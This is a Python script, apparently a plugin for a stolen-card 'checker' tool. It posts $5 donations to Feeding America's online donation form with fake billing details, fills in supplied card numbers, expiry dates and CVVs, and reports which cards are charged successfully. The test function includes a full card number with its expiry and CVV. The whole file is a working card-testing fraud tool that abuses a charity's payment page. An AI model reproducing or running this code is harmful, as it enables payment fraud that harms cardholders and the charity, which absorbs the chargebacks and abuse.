from api.parentchecker import ParentChecker
import random
from bs4 import BeautifulSoup


URL = "https://secure.feedingamerica.org/site/Donation2"

HEADERS = """Host: secure.feedingamerica.org
Connection: keep-alive
Content-Length: 2322
Cache-Control: max-age=0
sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="98", "Google Chrome";v="98"
sec-ch-ua-mobile: ?1
sec-ch-ua-platform: "Android"
Upgrade-Insecure-Requests: 1
Origin: https://secure.feedingamerica.org
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Linux; Android 12; Phone 2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.87 Mobile Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://secure.feedingamerica.org/site/Donation2
Accept-Encoding: gzip, deflate, br
Accept-Language: es-US,es;q=0.9"""

POSTDATA = """user_donation_amt=%245.00&company_min_matching_amt=&currency_locale=en_US&variationhidden=&referrerhidden=https%3A%2F%2Fsecure.feedingamerica.org%2Fsite%2FDonation2%3Fdf_id%3D25431%26amp%3B25431.donation%3Dform1&onsite_promohidden=&keywordhidden=&level_standardexpandedsubmit=true&level_standardexpandedsubmit=true&level_standardexpandedsubmit=true&level_standardexpandedsubmit=true&level_standardexpandedsubmit=true&level_standardexpandedsubmit=true&level_standardexpanded=40368&level_standardexpanded40368amount=%245.00&level_standardexpandedsubmit=true&level_standardsubmit=true&level_standardauto_repeatsubmit=true&responsive_payment_typepay_typeradio=credit&responsive_payment_typepay_typeradiosubmit=true&responsive_payment_typesubmit=true&billing_first_namename=Ross&billing_first_namesubmit=true&billing_last_namename=Geller&billing_last_namesubmit=true&billing_addr_street1name=39+Judith+Pl&billing_addr_street1submit=true&billing_addr_street2name=&billing_addr_street2submit=true&billing_addr_cityname=East+Islip&billing_addr_citysubmit=true&billing_addr_state=AL&billing_addr_statesubmit=true&billing_addr_zipname=25580-331&billing_addr_zipsubmit=true&billing_addr_country=Brazil&billing_addr_countrysubmit=true&donor_email_addressname=random{rnum}%40gmail.com&donor_email_addresssubmit=true&donor_email_opt_inname=implicit&donor_email_opt_insubmit=true&donor_remember_mename=on&donor_remember_mesubmit=true&gift_on_behalf_of_companysubmit=true&company_or_organization_name_input=&company_or_organization_namesubmit=true&gift-ref=&responsive_payment_typecc_typesubmit=true&responsive_payment_typecc_numbername={ccn}&responsive_payment_typecc_numbersubmit=true&responsive_payment_typecc_exp_date_MONTH={month}&responsive_payment_typecc_exp_date_YEAR={year}&responsive_payment_typecc_exp_date_DAY=1&responsive_payment_typecc_exp_datesubmit=true&responsive_payment_typecc_cvvname={cvc}&responsive_payment_typecc_cvvsubmit=true&idb=1209864335&df_id=25431&mfc_pref=T&browser_input=Mozilla%2F5.0+%28Linux%3B+Android+12%3B+Phone+2%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F98.0.4758.87+Mobile+Safari%2F537.36&browsersubmit=true&lightbox_choicehidden=nolightbox-onetime&paypal_transactionidhidden=&paypal_billingplanidhidden=&paypalxc_initialsustaininghidden=&25431.donation=form1&pstep_finish=Submit"""

COOKIES = "Cookie: JSESSIONID=FC752CFE4512F63E7804E832209ACC68.app20048a"


class Checker(ParentChecker):
    """New Checker site by Shadow.

    :param card: Card, saparated by |
    """

    def __init__(self, card):
        # This will change to True  if  card iis invlalid when we call super init
        self.invalid = False
        super().__init__(card)
        if self.invalid == True:
            raise ValueError("Invalid Card Format")

    def make_request(self):
        self.add_cookies(COOKIES)

        url = URL
        headers = super().format_headers(HEADERS)
        postdata = POSTDATA.format(rnum=random.randint(11111, 999999), ccn=self.ccn, month=int(self.month), year=self.year, cvc=self.cvc)

        res = self.session.post(url=url, headers=headers, data=postdata)
        soup = BeautifulSoup(res.content, "html.parser")
        error_msg = soup.find(class_="field-error-text")

        if error_msg is None:
            with open("res.html", "w") as file:
                file.write(res.text)
            return "Success! Charged 5$"


        return error_msg.get_text()


def test():
    checker = Checker("5455100022897083|10|2022|318")
    print(checker.make_request())

if __name__ == "__main__":
    test()

